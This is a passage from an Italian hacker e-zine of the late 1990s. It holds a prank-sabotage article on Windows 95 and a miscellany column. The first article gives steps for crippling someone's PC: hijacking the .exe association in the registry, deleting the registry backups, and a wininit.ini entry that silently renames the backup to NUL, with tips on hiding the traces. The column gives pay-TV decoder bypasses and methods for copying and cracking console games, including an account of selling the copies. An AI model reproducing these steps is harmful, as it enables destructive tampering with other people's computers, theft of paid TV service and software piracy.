morire l'amato utente di Windows (cosa che forse e' piu' facile, forse no,
vedremo).
Alcune cose sono proprio basate sui suoi titoletti e riportate nell'os +
copiato del mondo, e' un messaggio, tributo, un riconoscimento al grande pIG.
Come dice anche il pIG queste cose le ho provate sul mio povero WinNunzio,
non mi sono mai permesso (non *ancora* forse sarebbe meglio dire ^grin^) di
provare queste cosucce su altri PC, sara' che nessuno mi ha ancora fatto
incazzare a dovere...

Premessa : Sfortunatamente il mio amore di 486 non ha ancora incontrato il
fato del testare la release 98 del WinPesce, quindi queste cose sono
state viste sul 95, per il 98 posso fare solo delle deduzioni..

Vediamo un po' cosa partorisce la mia mente perversa..

WIN-MOTD =)
Questa cosa la sanno cani e porci, non e' nulla di hack o affini ma io la
addo brevemente (just for fun o anche just for fuck se lo preferite =)).
Allora e' possibile sostituire l'immagine di WinGesu' dell'avvio (e volendo
anche dell'uscita, ma non ci interessa x ora) con qualcosa di piu' carino,
per esempio quella che ho io "SATAN WAS HERE" scritto col sangue su fondo
nero (molto di classe devo dire, prendetevi la jpg da www.satan.com e
convertitela come leggete qui sotto).
Allora e' very easy, basta fare un BMP a 320x400, rinominarlo in LOGO.SYS e
sbatterlo in c:\
Semplice semplice, mi vedo gia' il prete della vostra parrocchia con un
attacco di cuore per il "possedimento" del suo PC AHAHAHA

C'ERA UNA VOLTA UN ESEGUIBILE
Premetto che questa cosa e' capitata davvero per colpa mia =) sul computer
di mio fratello e non vi dico quanto cazzo di tempo c'ho messo per metterlo
a posto.
Allora, nel registro di WinCozza, sotto HKEY_CLASSES_ROOT trovate i
riferimenti alle varie estensioni, del tipo la JPG me la chiami col Paint
Shop Pro e cosi' via, beh direte che me ne fo? Pensa McGyver Pensa!!
Anche gli eseguibili ce sono, infatti i .exe sono linkati a Exefile (sempre
presente in Hk...Root), se "qualcuno" =) cambiasse per sbaglio il puntamentos
del .exe da exefile a per esempio WinAmp.File, cosa succederebbe? Simplex,
OGNI eseguibile che cercate di far partire da WinOstrica viene passato come
parametro al Winamp dicendogli di aprirlo, e il Winamp cosa dira'? Ma che
cazz di file mi passi coglione, non lo conosco sto formato audio =))
In questo bel modo, abbiamo il WinTrota andato a puttane, visto che non si
riuscira' piu' a eseguire alcun eseguibile, tanto meno il regedit per poter
rimettere a posto il danno.
E non pensate di far partire un file.reg per mettere a posto il tutto,
WinNasello interpretera' la richiesta come regedit.exe file.reg e quindi cosa
fara'? Indovinate un po'... :))
Non vi dico la soluzione che ho dovuto adottare per salvare il sistema del
brother senza che dovessi reinstallare il tutto e senza che mi inculasse a
sangue, la lascio alla vostra abilita'... =))
Ovviamente il discorso vale anche per altri tipi di programmi, non solo per
Winamp, ma bisogna vedere qual e' il programma migliore x questo scherzetto.
Lo so lo so vuoi direte "basta copiare i vecchi file di registro sopra quelli
nuovi" e io aggiungo " e chi cazz ve l'ha detto che ci sono ancora? =)"
Eh si', basta cancellarli e col cazz che l'amato idiota riuscira' a ricopiare
da prompt (sempre che sappia cos'e' il prompt) i backup del registro.
Su WinPalombo '98 non ho testato il tutto MA visto che il backup di registro
e dei file di sys vien fatto in un CAB (messo nella dir \SYSBACKUP) basta
"agire bene" anche su quello.

L'INI CHE FA TENDENZA
Veniamo a una feature un po' imboscata del WinCernia:
nei meandri delle dir del simpatico sistema operativo (praticamente nella dir
c:\windows o simile =)), c'e' un programma chiamato WinInit.exe che a detta
del Devoto Win95 Resource Kit e' usato per fare un paio di lavoretti quando
installate Win, vi riporto il pezzo:
"After first restarting the computer during the final system configuration
phase, Windows 95 Setup updates configuration files by performing the
following steps:
WININIT.EXE processes three sections in WININIT.INI to combine all the
virtual devices (VxDs) into VMM32.VXD and to rename files initially used
by Setup, including ARIAL.WIN, USER32.TMP, and LOGO.SYS.
[..]
A flag is set in the Registry that indicates this is the first time Windows
95 is being run after a new installation."
Beh peccato che anche se viene settato un flag x dire che e' la 1ma volta
che viene eseguito, il Wininit.ini viene processato ad OGNI esecuzione di
WinFiletto di Platessa =))

E allora direte voi? Vi riporto un esempio di wininit.ini : 

[rename]
Shit.sys=c:\windows\SYSTEM.DA0

..mi pare ovvio che rinomini system.da0 in shit.sys =)

Embe' direte voi? Allora miei prodi programmatori, pensate ai puntatori,
pensate a un bel NUL =))
Eh si', basta fare

[rename]
NUL=c:\windows\system.da0

e indovinate dove finisce il simpatico backup del registro =)
Ah dimenticavo, i file di registro sono SIA System.Dat (e da0 come backup)
SIA User.dat (e da0), ma tanto voi lo sapevate vero?
Si ok ho capito che volendo potreste cancellarlo direttamente con un bel
delete MA volete mettere la bellezza di un file che prima c'e', ma all'avvio
dopo scompare? Si' lo so sono perverso =)

PS: Il vero cattivone setta la data del wininit.ini un po' indietro nel
tempo, cosi' non si vede che e' l'ultimo file messo nella dir di WinSgombro
PPS: Il file wininit.ini alla fine del tutto mi PARE che venga rinominato
in wininit.bak e resta come prova, ma secondo me e' una prova del cattivo
funzionamento di Win no ? :))
PPPS: Meglio evitare i nomi lunghi, usate la magica tilde (~)
P^4.S: Non OSO pensare cosa possa succedere smanettando coi settaggi dei VXD
quando mette insieme VMM32.VXD =))

Quindi se 2+2 = 4 ma lim n->+inf di (1+x/n)^n = e^x ops sto degenerando =)
dicevo se avete seguito il discorso avete capito un modo per far incazzare
un tantinello l'utente di WinSeppia, quindi se l'utente e' bravo ci mettera'
un popo' di tempo x mettere a posto il systema, se invece e' chiavica, non
gli restera' che reinstallare WinTotano (e pensera' come al solito ad un
difetto di questo AMATO sistema operativo).
Beh ovviamente le procedure di cui sopra si possono anche automatizzare
con file.reg oppure con miniprogrammini ad-hoc, a seconda delle esigenze,
dai lo so che tra di voi si nascono dei programmatori che amano far danni =)

IL MIO SOGNO ERA AMMINISTRARE L'HARD DISK
Che ne dite di far vedere a tutto il mondo quando e' bello il nostro HD?
E cosa c'e' di meglio che condividire il tutto eseguendo il mio shareall.exe
(vedere BFi4) =)))
Come dice il pIG, fatelo sul vs pc solo se sapete di dover morire =))

Mmmmm vediamo se mi viene in mente altro, bah direi che per il momento
basta, non ho voglia di parlare di cose quali troiani classici (BO e affini)
e virus, mi pare siano autoesplicativi e wide-spread... =))
(comunque a tal proposito date un okkio all'interessantissimo Net Raider
Project a cura del grande \sPIRIT\ (lo trovate sempre su questo numero..))
Chissa' se in futuro mi verra' in mente qualcos'altro di cattivo...

Horse "im-so-fuckin-evil" Of the Horses


-----------------------------[ CAZZATE A NASTR0 ]-----------------------------
---------------------------------[ Dr_Slump ]---------------------------------

--> Indice --> 0.0
0.0 Indice
0.1 Intro della intro
0.2 Materiale di consumo
1.0 Intro
2.0 Tele+. D+ e cazzate simili...
3.0 Il fantastico mondo degli mp3
4.0 Tiscali, Infostrada, Wind against Telecom
5.0 Tutto quello che dovete sapere sulla playstation
6.0 In klima alkooliko
7.0 La grande N e il sogno casto della Sega
8.0 Outro

--> Intro della Intro --> 0.1
BFi5 esce fra un pochissimi giorni ed io, come al solito, mi ritrovo qui
all'ultimo momento con molte idee in testa, ma con poko tempo per attuarle.
Che cazzo fare allora? Mmmh che ne dite di un articolo dove comincio a dire
cazzate a nastro? Un articolo in cui passo da un argomento all'altro senza
curarmi tanto di quello che dico? Allora vi piace l'idea? No? Sorry, ma nun
ve ce posso fa niente ;-) iniziamo va...

--> Materiale di consumo --> 0.2
Ormai fare un articolo senza mettere una lista dettagliata delle cazzate che
si sono consumate durante la sua stesura e' come uscire il sabato sera senza
bersi nemmeno una birra e quindi:
Consumi:
- 1 Pacchetto di sigarette Galuoises Blu (regolare no? ora vediamo quante ne
  fumo)
- 1 Bottiglia d'acqua della marca + infima del supermercato qui vicino
Luogo di stesura:
- Ufficio
- Casa
Musica di sottofondo:
- Radio Deejay
- Colle der Fomento "Scienza doppia H"
- Piotta "Comunque vada sara' un successo"

--> Intro --> 1.0
Allora eccoci qui a festeggiare, se non erro, il primo anno di pubblicazione
di BFi, di cazzate ne sono state dette molte (almeno da parte mia, gli altri
sono tutta gente seria...) e molte altre se ne diranno. Spero che qualcuno
abbia imparato qualcosa dalle nostre cazzate (penso di si' visto la gente
che viene a salutarmi/complimentarsi su IRC), e spero che molti altri
impareranno (beh se qualcuno ha imparato da me, ora e' sicurmente un mezzo
alkolizzato, che ascolta mp3 mentre cracca qualche stupido programma...).
Questo specie di articolo e' dedicato a tutti gli altri membaz del gruppo, che
dire? Siete grandi ;-)

--> Tele+. D+ e cazzate simili... --> 2.0
Premetto che e' da pokissimo tempo che mi sto interessando a questo settore,
quindi per ora posso darvi pokissime notizie, cerchero' di essere il piu'
esauriente possibile su un futuro articolo nel qualche trattero' piu'
esplicitamente questo settore. Per ora accontentatevi del poko che so, ok?
1) E' possibile vedere Tele+ Analogica usando Pc + Scheda Tv + opportuno
software?
- Vedere Tele + analogica, usando il PC con una scheda TV (senza decoder
di sorta of course) e un apportuno programma di decodifica... beh che dire?
Io ho letto tonnellate di mex sui newsgroup, provato decine di programmi, ma
non c'e' stato nulla da fare. Forse non ne sono stato in grado io, quindi se
qualcuno c'e' riuscito e' pregato di inviare info a dr.slump@thepentagon.com
2) E' possibile evitare di pagare l'abbonamento a Tele+ analogica?
- Mmmh su un newsgroup ho trovato questa info che e' tutta da testare:
Decoder T+ (modello DT 1000)
Interventi da effettuare sul decoder:
 - eliminare la R602
 - ponticellare la L706
 - eliminare T601 e ponticellare emettitore con base
Se il tutto funziona dotare di aletta di raffreddamento il chip quadrato,
zoccolato che dovrebbe essere marchiato Texas.
- JohnnyRun ci ha segnalato questo trick (funzia solo con telepiu' 2nda
generazione (siglato ComCript 4000):
"ATTENZIONE: non pensare di comprare un decoder comcrypt 4000 a scatola
chiusa! Moltissimi modelli sono stati ritirati e revisionati quindi il bug
(software) e' stato rimosso.
Ecco la procedura:
 - sintonizzate sul 1mo canale la frequenza di Telepiu' (se il decoder non e'
   attivo apparira' E3o E0 )
 - scollegate l'antenna
 - premete il tasto - per tornare indietro con i canali ( apparira'
   la scritta rr)
 - ricollegate l'antenna
 - godetevi il film o la partita Pr cambiare da +1 a +2 va eseguita la stessa
   procedura"
3) Schede pirata?
- Mmmmh qui il discorso si fa interessante, proprio alcuni giorni fa un mio
amico (di cui evito di fare il nome) mi ha detto di aver trovato in Svizzera
(w la cioccolata al latte!) al prezzo di circa 500.000 una smart card che
permetta di vedere l'intero pakketto D+ compreso la formula 1 e +calcio,
nonche' l'intero pacchetto stream... che dire? Mi inchino di fronte
all'arteficie di questa cosa. Ahem c'era riuscito anche un italiano della
provincia di Ancona, solo che attualmente e' in villeggiatura in luoghi
freschi...
4) Dmac?
- Mmmmh ci ho capito ankora poko... il Dmac e' un software che va a sostituire
quello proprietario del decoder Nokia, e che permette di vedere a scrocco
alcuni satelliti tra cui quello di D+ (?).
So che probabilmente non ho risolto nessuno dei vostri problemi, ma spero
almeno di avervi chiarito qualche dubbio, vi consiglio di rimanere
sintonizzati, sul prossimo numero di BFi cerchero' di essere il piu'
esauriente possibile. Chi avesse informazioni e' come sempre pregato di
scrivermi una e-mail.

--> Il fantastico mondo degli mp3 --> 3.0
Tutto quello che troverete scritto qui di seguito e' dedicato all'amico
Cavallo ;-)
Che cazzo e' successo negli ultimi mesi nel mondo degli mp3? Mmmhh andiamo
con ordine...
1) Players
- Allora sembrerebbe che sul web ci siano ormai 3 players che regnano
incontrastati su tutti gli altri. Sto parlando chiaramente del classico
Winamp, del bellissimo Sonique e del potente Kjofol. Analizziamoli meglio:
* Winamp: reperibile all'url www.winamp.com questo e' ankora il piu' usato.
Forte di moltissimi plug-in, questo player permette di suonare quasi ogni
tipo di file (tranne gli aac se non erro) compresi vqf e sid. Che dire? E' il
piu' usato...
* Sonique: www.sonique.com , interfaccia grafica tra le piu' belle, buona resa
sonora, non so perche' ma non mi sembra proprio che riesca ad emergere...
* Kjofol: www.kjofol.org , questo e' il player che attualmente + mi piace. Ha
una ottima resa sonora, e' quello che consuma meno cpu, e' l'unico che playa
gli aac e i vqf di serie senza l'aggiunta di alkun plugin. Interfaccia grafica
molto accativante e personalizzabile al massimo (supporta anche gli skin del
winamp). Che dire? Se non lo avete scaricatevelo!
2) Ripper e Encoder e mp3 vbr
Mmmhh tralasciando i vari blade encoder e i classici dello studio fraunhofer
che producono sempre mp3 di ottima qualita', ma con tempi abbastanza lunghi
volevo soffermarmi su un software che grabba e encoda i cd allo stesso
tempo... Sto parlando dell'audiocatalyst che usa il motore di compressione
dello Xing e quello di grabbaggio di Audiograbber. Il sw che ne esce fuori e'
molto potente e permette di grabbare un intero cd e tasformarlo in mp3 in
pochi minuti. Particolarita' di questo sw e' la possibilita' di produrre mp3
vbr.
Che cosa sono gli mp3 vbr? Sono mp3 con byte rate variabile a seconda del
punto della canzone... mi spiego meglio: la canzone viene encodata, dove
rischiesto, con un byte rate maggiore, quindi anche se l'mp3 e' a 128kb in
alcuni punti potrebbe tokkare i 180kb... da provare!
3) Aac e vqf
Dei vqf gia' ne avevamo parlato la volta scorsa se non ricordo male, quindi
evito di esaminarli di nuovo... Gli aac cominciano a prendere piede, questo e'
un formato di compressione che usa le librerie degli mp4 e "produce" dei file
che pur okkupando quanto un normale mp3 hanno una qualita' maggiore (molto..).
Unico neo di questo formato sta nel fatto che per encodare una canzone ci
vuole un discreto tempo e che non tutti i player sono in grado di suonarli
(il kjofol si!).
4) Diamond Rio e Samsung Yeep
Questi sono i primi due player portatili di file mp3. Il loro prezzo si aggira
sui 200$ e le loro caratteristiche sono molto simili. Tutti e due i player
come supporto per gli mp3 usano una flash ram. Dando uno sguardo alle
caratteristiche dei due prodotti sembrerebbe che sulla carta il samsung sia
migliore per due motivi: 1) ha una falshrom da 40mb (il diamond da 32mb)
2) pur essendo della stessa grandezza del diamond ha anche la radio digitale
incorporata. Comunque nei prossimi mesi ne dovrebbero uscire a bizzeffe di
lettori del genere che usino i piu' svariati supporti, dagli hard-disk ai
classici cd... beh staremo a vedere :)
5) Ultim'ora
Sembrerebbe che la casa di Easy Cd con un patner (cazzo scusatemi, ma non mi
ricordo proprio i nomi...) stia studiando un sistema di masterizzazione che
permetta di far leggere cd di mp3 ai normali lettori cd. Che dire? Se
effettivamente ci riuscissero giuro che mi comprero' il programma originale!
6) Una domanda che mi perseguita su irc...
Su irc avro' letto mille volte domande del tipo "Come faccio a trasformare
gli mp3 in wav?" allora aprite il winamp e premete CTRL-P, andate in
Audio I/O e in Output Plugins selezionate Nullsoft disk writer plugin.
Playate ora la vostra song ed il gioco e' fatto...

--> Tiscali, Infostrada, Wind against Telecom --> 4.0
Cazzo era ora! Dopo anni di monopolio ecco affacciarsi sul territorio
compagnie telefoniche diverse dalla solita ladra Telecom
(Come dice Berry uscite da casa e date fuoco alla prima cabina telefonica che
incontrate!). Tutte le compagnie in questione sembrano dare molta importanza
a internet, che dire? Staremo a vedere cosa succedera' nei mesi a venire. 
1) Wind: Sto scrivendo queste cazzate negli ultimi giorni di febbraio e ancora
non sono riuscito a scoprire le tariffe telefoniche relative a Wind, comunque
questa dovrebbe essere per ora l'unica compagnia che permetta
indifferentemente l'uso di un cellulare o della classica rete fissa. Non male
come idea vero? Altra cosa molto interessante e' che sembrano andati a buon
fine gli sperimenti relativi al "passaggio" di internet su linea elettrica,
anziche' sulla canonica telefonica. Proprio ieri sera mi hanno comunicato che
forse entro fine anno potremmo viaggiare su internet a velocita' pazzesche
e io naturalmente ho gia' pronti i siti dove scaricare tonnellate di fullcd
in formato mp3 (Cavallo tranquillo un giorno di questi penso anche a te!).
2) Tiscali: per ora questa compagnia sembrerebbe attiva solo a Roma, Milano e
in Sardegna. Prima di passare alle tariffe sembrerebbe che nelle citta'
sopra indicate a tutti gli abbonati Tiscali sia offerto gratuitamente
l'abbonamento a internet, appena possibile sperimento tutto dall'ufficio e vi
faccio sapere come vanno le cose ok?
3) Infostrada: la prima compagnia ad essere scesa in "strada". Forte di una
campagna pubblicitaria imponente, forte di tariffe accattivanti, questa
compagnia e' gia' entrata nelle case di milioni di italiani (anche la mia...).
Da quanto ho potuto constatare hanno un servizio clienti eccezionale,
attivazione in 48h, canone inesistente, belle fike agli aeroporti che
distribuiscono depliant... Da provare insomma, tanto e' aggratise!
Per quanto riguarda internet, si appoggia a IOL con dei pacchetti di
abbonamento di 3 mesi a 45 carte da mille. Il pakketto in questione incorpora
inoltre l'abbonamento a Infostrada e la possibilita' di pagare mensilmente
l'abbonamento a Internet (15 carte al mese...).
Ed ora un confronto delle tariffe fra Infostrada e Tiscali, premettendo che
in entrambi i casi queste sono inferiori alle canoniche Telecom:

TISCALI (solo da Roma, Milano, Sardegna)
* Carte telefoniche + 10030 prima del numero da comporre
* Nessuno scatto alla risposta, minimo di conversazione 30 secondi (= verranno
comunque addebitati come minimo 30 secondi)
--> Interrurbane fuori distretto:
	dalle 8.00 alle 18.30 Lire 200
	dalle 18.30 alle 8.00 Lire 100 Sabato+Domenica+Festivi
--> Cellulari Business e Family:
	dalle 8.00 alle 18.30 Lire 500
	dalle 18.30 alle 8.00 Lire 250 Sabato+Domenica+Festivi
--> Internazionali:
	esempio USA Lit. 442/min.

INFOSTRADA (tutta Italia)
* 1055 prima del numero da comporre
* Alla risposta vengono addebitate lit.125 e poi si pagano gli effettivi
secondi di conversazione
--> Regionali:
	dalle 8.00 alle 18.30 Lire 230
	dalle 18.30 alle 8.00 Lire 95  Sabato+Domenica+Festivi
--> Nazionali:
	dalle 8.00 alle 18.20 Lire 270
	dalle 18.30 alle 8.00 lire 130 Sabato+Domenica+Festivi
--> Cellulari Family:
	dalle 7.30 alle 20.30 lire 1.250
	dalle 20.30 alle 7.30 lire 150 Sabato+Domenica+Festivi
--> Cellulari Business:
	dalle 8.00 alle 18.30 lire 550
	dalle 18.30 alle 8.00 lire 250 Sabato+Domenica+Festivi
--> Internazionali:
	esempio USA Lit. 450/min.

Tiscali sembrerebbe migliore, pekkato che attualmente non copra tutta l'Italia
ma solo la Sardegna, Milano e Roma. Una nota: come amministratore delegato
della Tiscali c'e' il personaggio che si cela dietro il botto di alcuni anni
fa di VideOnLine...

--> La sony e la sua giocastazione --> 5.0
Molte volte chattando su ircnet mi e' capitato di leggere su alcuni canali di
gente che chiedeva insistentemente come cazzo si copiano i giochi della
playstation, quindi ho pensato di scrivere una guida che spieghi in poche
parole come riuscire a copiare questi cd dal colore nero che avete affittato
dal vostro negozio di sfiducia.
Ma andiamo con ordine.
1) Modifica: la prima cosa che dovete fare se volete sfruttare i cd
masterizzati e' fare in modo che la vostra giocostazione riconosca questi
ultimi come dei normali cd originali dal classico colore nero. Come fare cio'?
Semplice: andate dal vostro cartolaio di fiducia prendete un bell'uniposca
nero e colorate per bene la parte inferiore del cd che precedentemente avete
masterizzato, mettetelo nella vostra psx e... ok ok Cavallo non rompermi il
cazzo come al solito giuro che d'ora in poi faccio la persona seria o quasi.
Dicevamo? Ah si' per prima cosa dovete modificare la vostra play tramite
opportuno chip (nota 1).
In allegato a questa guida (file psx.zip) trovate gli schemi che vi spiegano
dove andare a saldare il chip. Naturalmente non mi assumo responsabilita' se
danneggiate la vostra psx mentre saldate, se non siete in grado sicuramente
nella vostra citta' qualcuno che modifica playstation c'e'... portate la
vostra amata console da quest'ultimo, lasciategli qualcosa come 30-50.000 ed
il gioco e' fatto.
Per dovere di cronaca devo informarvi che esiste anche una cartuccia, simile
all'explorer, che una volta collegata alla psx salta la protezione relativa
al non riconoscimento dei giochi masterizzati, questa e' in vendita a
circa 90.000 e a differenza della modifica non fa cadere l'eventuale garanzia
della giocostazione.
Ci sono voci su internet di un programma che masterizza giochi psx i quali
dopo funzionano senza necessita' di modifica. A me non risulta vero, forse
molti lo confondono con il boot disk dello yaroze quindi evitate di scaricare
inutili fake. (Cavallo cosi' ho risposto anche a te...).
Prima di addentrarmi nei poki cenni alla masterizzazione vera e propria
volevo consigliarvi di investire ulteriori 15.000 per comprare un cavetto
scart alla vostra console, in modo da poter visionare a colori anche i giochi
extra-europei (e non speditemi e-mail con su scritto che esiste anche il
color chip che non necessita di scart che lo so gia'... solo che usare un
cavetto scart e' molto piu' professionale... colori migliori (rosso) meno
sfarfallamenti...).
2) Masterizzazione: finite le cazzate di routine (non so perche', ma sono
sicuro che qualcuno ha gia' risolto i suoi problemi relativi alla
masterizzazione dei giochi play...) vi informo che allo stato attuale delle
cose (scrivo a fine febbraio 99) ci sono solo tre giochi che necessitano
di crack mentre tutti gli altri si copiano senza fatica usando opportuni
programmi di masterizzazione.
I programmi di masterizzazione da me testati sia su lett./mast. scsi che su
lett./mast. ide sono: Prassi Cd Replicator, CDrWin, Nero 4.0 . Usando
indifferentemente uno tra questi programmi, senza impazzire con configurazioni
particolari, sono riuscito a copiarmi senza problemi tutti i giochi della psx
che possiedo (oltre 200).
Prima di passare ad analizzare i singoli programmi vi elenco quelle che
secondo me sono le regole base per copiare senza difficolta' i giochi della
psx:
a) possibilmente cercate di utilizzare sempre cd vergini di buona marca, non
usate cd bulk, questo perche' questi ultimi non sono letti da tutte le
playstation, sopratutto quelle vecchie, (nota 1) ed inoltre se li dovrete
ricopiare avrete senza ombra di dubbio meno problemi. Le marche che fino ad
ora non mi hanno dato mai problemi sono: Waitec, Princo, Tdk, Verbatim,
Traxdata. I bulk che ho tentato di usare mi hanno dato quasi sempre problemi
sopratutto sulle play vecchie o in fase di re-masterizzazione. In poche
parole investite 300-400 lire di piu'!
b) cercate sempre di fare l'immagine su hard disk del cd che volete copiare,
e' piu' salutare la cosa, questo perche' spesso i cd che affitate sono
rovinati e non sempre il vostro lettore/masterizzatore e' in grado di
leggerli alla velocita' necessaria per la masterizzazione on fly. Stesso
discorso per i cd che scroccate ai vostri amici.
c) possibilmente non masterizzate mai i giochi psx a 4X, a volte si possono
avere problemi. Masterizzate a 2X se potete.
3) Programmi: per prima cosa procuratevi uno qualsiasi di questi tre
programmi:
* Nero 4.0 ---> http://www.ahead.com (lo trovate anche nel numero di gennaio
di TGM)
* Prassi Cd Replicator ---> http://www.prassi.com
* Cdrwin 3.6 ---> http:///www.goldenhawk.com
Tutti i programmi sopra elencati supportano sia masterizzatori ide che scsi.
Vi informo poi che su internet ci sono alcuni programmi quali PSX Backup
(che sembrebbe una versione modificata del Prassi CD Replicator) e PSX Copy
(che altro non e' che una interfaccia grafica per il Dao aka versione dos
di CDrWin) che sono stati "scritti" appositamente per copiare i giochi
playstation.
Per eventuali e varie vi ricordo che il mio address e'
dr.slump@thepentagon.com
4) Giochi protetti: come dicevo sopra allo stato attuale delle cose ci sono
tre giochi per la playstation protetti. Qui di seguito troverete le istruzioni
per copiarli (i crack sono in psx.zip). I giochi protetti sono:
a) Medievil: per masterizzare Medievil per prima cosa dovete creare una
immagine .bin sul vostro Hd usando CDrWin. Una volta fatto cio' mettete il
file del crack nella stessa dir dell'immagine e lanciatelo. A esecuzione
terminata potrete copiate tranquillamente Medievil usando sempre CDrWin. Ora
Medievil e' sprotetto. Non credete alle legende metropolitane che sia
possibile copiare Medievil craccato solo con alcuni masterizzatori. Ne ho
testati abbastanza e non ho mai avuto problemi.
b) Final Fantasy 8: cazzo se vi serve copiare questo gioco evidentemente
sapete il giapponese visto che per la versione pal si deve ancora attendere
a lungo...
c) Poprogue: blah blah blah
5) Emulazione: negli ultimi mesi si parla molto dell'emulazione della play
su pc. Vi do subito i due siti di riferimento con qualche info:
a) http://www.psemu.com ---> freeware, aggiornato molto spesso tramite
opportuni plugin, supporto per schede d3d, 3dfx, emulazione pad, memory card,
sonoro e action replay. Ho testato l'ultima versione disponibile e sembra
rulezzare... provatelo!
b) http://www.bleem.com ---> a pagamento. Ancora non e' stata rilasciata
alcuna versione ufficiale di questo stupendo e quasi perfetto (dicono)
emulatore. Su internet e' girata solo e per poki giorni una beta version
abbastanza vecchiotta, che pero' aveva (ha) una compatibilta' e una velocita'
impressionante. La versione definitiva dovrebbe uscire in quel di febbraio
con supporto filmati, schede d3d, 3dfx, sound, pad e memory card.
So che dovrebbe uscire un demo il 26 febbraio e che in questi ultimi giorni
su internet gira una seconda beta che altro non e' che una versione hackerata
della prima con nessuna feature in piu'.
6) Note:
a) nota 1: nei primi modelli di playstation, scph-1001 se non ricordo male,
era possibile far partire i giochi masterizzati senza alcun tipo di modifica,
usando il famoso trucco dello "sportelletto" del cd.
b) nota 2: se la vostra playstation non legge un cd perche' quest'ultimo e'
bulk il tentativo estremo per farlo funzionare e' quello di mettere sotto
sopra la psx, ovvero con lo "sportelletto" del cd che poggia sul tavolino.

--> In klima alkooliko --> 6.0
Dopo 4-5 articoli semi-seri ecco al voi il pikkolo angolo del kazzeggio ;-)
Si' si' sono ankora vivo, sono sopravvissuto al kapodanno, questo mese niente
guide enciclopediche (vi dico solo una cosa: preparatevi...) ma solo un
consiglio che erroneamente mi ero scordato di includere in Treccanne (grazie
a tutti/e per i complimenti...) e che e' di vitale importanza.
Questo e' secondo me il miglior metodo anti-collasso che conosca, se
collassate anche in questo modo vuol dire che siete molto vicini a quello che
e' il mitico coma etilico: consiste nell'ingurgitare prima di bere un
qualsiasi alkooliko uno o due cucchiai di olio di oliva (lavatevi i denti
dopo...). facendo in questo modo sullo stomaco si crea una sorta di membrana
di grasso che vi permette di "digerire" al meglio l'alkool.
Vi diko solo una kosa, io ho usato questo metodo a capodanno, ho preso i
cucchiai d'olio alle 6 di pomeriggio e ho bevuto e fumato quasi
ininterrotamente fino alle 6 del mattino. Morale: gli amici che erano con me
pur bevendo molto di meno quando era verso l'una di notte hanno iniziato a
collassare (gente allenata...) e io sono andato a letto storto una cifra, ma
senza collassare...

--> La grande N e il sogno casto della Sega --> 7.0
Piu' che sogno casto della sega in questi giorni di clima Sanremese si
dovrebbe parlare di seghe sognando la Casta (surf.to/covergirls), ma questo
e' un'altro discorso...
Ho parlato poke righe sopra della playstation e mi sembrava giusto parlare
anche delle Sega e della Nintendo per alcuni motivi che capirete a fine
articolo. Ma come al solito andiamo con ordine.
1) Sega Dreamcast: da fine novembre in tutti i negozi nipponici ha fatto
la sua comparsa la nuova console della Sega. Ho avuto occasione di vederla
piu' volte e vi assicuro che e' qualcosa di mostruoso pekkato ke il costo qui
in Italia per una console di importazione sia elevato (ultimo prezzo trovato
640.000...). Ma perche' sto parlando di dreamcast in una e-zine che si okkupa
di h/p/c/v e generalmente di materiale underground? Beh semplice: ho trovato
molto interessante il sistema di protezione usato dalla sega e volevo
parlarne un attimo. Inanzitutto il lettore non e' un DVD come molti credono,
ma un normale CD proprietario yamaha. Cosa interessante di questo lettore
CD e' che i cd una volta inseriti girano al contrario. Interessante vero?
Cosa ankora piu' interessante sono i supporti che oltre ad essere da un giga
presentano un'altra particolarita'. Infatti vedendo il lato inferiore del cd
si nota subito che il cd inizialmente e' scritto poko (3mb per l'esatezza...)
poi troviamo una banda "vergine" dove ci sono le solite scritte del cazzo tipo
sega dreamcast e poi infine troviamo quello che e' il gioco vero proprio. Bel
problema vero?
Inserendo il cd in un normale lettore/masterizzatore questo vede solamente i
primi 3mb. Ma i giochi si copiano vi chiederete? Mmmmh in giro ci sono molte
leggende metropolitane, comunque una delle tesi piu' in voga sembrerebbe
quella di copiare questi CD usando il packet cd (ho scoperto sta cosa solo
poki giorni fa e la testero' a breve, ma purtroppo devo consegnare l'articolo
e scoprirete il tutto la prossima volta, stay tuned!)... comunque tranquilli
alla fine un metodo si trova...
....update:
		Dreamcast copied? by Dr_Slump al volo per BFi 5
INTRO
Queste sono le ultime voci relative alla copia dei giochi dreamcast, BFi
esce fra 5 minuti e io sono ankora qui. Andiamo con ordine:
METODO 1
I giochi Dreamcast possono essere copiati, ma il vostro masterizzatore deve
supportare Packet CD ed essere in grado di finalizzare in Packet CD. Ecco
come fare: inserite il gioco DC nel lettore CD-ROM del PC, inserite un CD-R
nel masterizzatore ed avviate Packet CD per configurare il CD-R alla
scrittura a pacchetti (v. "Packet Writing"). Copiate tutti i file verso il
CD-R, finalizzate il disco Packet CD usando Easy CD PRO 95. Inserite il CD
nella Dreamcast e giocate!
Nota: non funzionera' sempre; posso riuscire a farlo funzionare, ma il disco
deve essere assolutamente privo di polvere ed impronte. Questo perche' il
lettore CD della DC e' veramente un c*sso!
METODO 2
Vi comunico con piacere che per quanto mi riguarda il mercato dei giochi DC
e' gia partito. Io li copio e li vendo con successo. Vi informo in che modo:
Master. Trax Data 2660 PRO SCSI, Lettore CD-ROM Creative 12X. Uso CDRWIN:
copia al volo. Supporti CD riscrivibili completamente argentati. Sto
effettuando prove con i CD audio argentati ed ho avuto il 60% dei risultati
positivi. Per ora continuo a copiare con CD-RW, costoso ma efficace
(TRAX DATA Lire 19.000). I CD non hanno bisogno di un'ulteriore pulizia,
leggono sempre e su qualsiasi console. Testati 58 CD per DC: 56 funzionanti.
METODO 3
Sega Dreamcast: I CDs possono essere copiati (o per lo meno alcuni...) con
CDRWin, o DiskJuggler, al volo: funziona persino la musica.
CONSIDERAZIONI FINALI
I giochi dcast non sono letti da tutti lettori cd quindi okkio!
Ho trovato tutte queste info oggi, sul prossimo numba di BFi vi sapro' dire
meglio!
Dedicato a SMaster che mi ha aspettato!
2) Nintendo 64: come un fulmine a ciel sereno e' uscito fuori dal nulla un
emulatore quasi perfetto di Nintendo 64 che permette attualmente di far girare
45 giochi compresi Mario 64 e Zelda 64! Ho scritto di questo emu per due
motivi. Il primo e' che mai nessun emulatore fino ad ora ha fatto notizia
come questo, gente che impazzisce per trovare le rom. La nintendo che si
inkazza di brutto e cosi' via. Il secondo motivo per cui scrivo, forse il piu'
importante, e' che questo emu necessita di una scheda 3dfx e in particolare
delle librerie glide.
Siccome non tutti hanno la 3dfx volevo informarvi che esistono i
glide wrappers, ovvero particolari programmi che permettono di "emulare" le
glide con l'uso o delle opengl o delle direct3d. Potete trovarle
all'indirizzo www.glidewrappers.com . Prima di chiudere volevo dirvi che e'
